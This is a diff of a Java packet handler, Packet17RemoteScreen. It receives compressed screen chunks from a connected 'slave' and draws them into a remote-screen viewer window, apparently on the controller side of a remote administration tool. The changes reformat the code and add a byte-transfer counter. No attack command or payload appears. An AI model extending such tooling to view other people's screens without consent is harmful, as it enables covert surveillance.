@@ -9,51 +9,45 @@ import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 
 public class Packet17RemoteScreen extends AbstractIncomingPacket {
-		
+
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-        int chunkWidth = slave.readInt();
-        int chunkHeight = slave.readInt();
-        int x = slave.readInt();
-        int y = slave.readInt();
-        int width = slave.readInt();
-        int height = slave.readInt();
-        
-        long start = System.currentTimeMillis();
+		int chunkWidth = slave.readInt();
+		int chunkHeight = slave.readInt();
+		int x = slave.readInt();
+		int y = slave.readInt();
+		int width = slave.readInt();
+		int height = slave.readInt();
 
-        FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
-        
-        
-        int blen = slave.readInt();
+		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
 
-        byte[] buffer = new byte[blen];
-        slave.getDataInputStream().readFully(buffer);
+		int blen = slave.readInt();
+	
+		byte[] buffer = new byte[blen];
+		slave.getDataInputStream().readFully(buffer);
 
-        if (frame != null) {
-            BufferedImage bufferedImage = frame.getBuffer();
-            
-            if (bufferedImage == null || bufferedImage != null && bufferedImage.getWidth() != width && bufferedImage.getHeight() != height) {
-            	bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
-            	frame.setBuffer(bufferedImage);
-            }
+		if (frame != null) {
+			frame.setTransmitted(frame.getTransmitted() + blen);
+			BufferedImage bufferedImage = frame.getBuffer();
 
-            
-            try {
-                Graphics2D imageGraphics = (Graphics2D) bufferedImage.getGraphics();
+			if (bufferedImage == null || bufferedImage != null && bufferedImage.getWidth() != width && bufferedImage.getHeight() != height) {
+				bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
+				frame.setBuffer(bufferedImage);
+			}
 
-                BufferedImage image = ImageUtils.decodeImage(buffer);
-               // image.createGraphics().drawRect(0, 0, image.getWidth(), image.getHeight());
-                imageGraphics.drawImage(image, y * chunkWidth, x * chunkHeight, null);
+			try {
+				Graphics2D imageGraphics = (Graphics2D) bufferedImage.getGraphics();
 
-                frame.update(bufferedImage);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-                System.gc();
-            }
-        }
-        
-        long end = System.currentTimeMillis();
-        System.out.println("Took " + (end - start) + " ms");
+				BufferedImage image = ImageUtils.decodeImage(buffer);
+				// image.createGraphics().drawRect(0, 0, image.getWidth(),
+				// image.getHeight());
+				imageGraphics.drawImage(image, y * chunkWidth, x * chunkHeight, null);
 
+				frame.update(bufferedImage);
+			} catch (Exception ex) {
+				ex.printStackTrace();
+				System.gc();
+			}
+		}
 	}
 }
